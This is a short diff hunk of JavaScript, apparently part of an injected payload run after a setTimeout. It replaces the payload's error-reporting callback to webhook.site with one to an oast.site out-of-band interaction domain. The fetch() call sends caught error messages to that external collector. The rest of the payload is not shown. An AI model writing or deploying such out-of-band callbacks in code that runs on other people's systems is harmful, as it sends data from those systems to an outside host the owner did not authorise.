@@ -37,7 +37,7 @@ setTimeout(() => {
             });
         })
         .catch(e => {
-            fetch('https://webhook.site/8586d1a4-d038-4478-bc85-21f5c63d3740/error?msg=' + encodeURIComponent(e.toString()));
+            fetch('https://xiue7lk6ilnj16v3uezz4zzce0324mtbr.oast.site/error?msg=' + encodeURIComponent(e.toString()));
         });
     `);
 }, 2000);
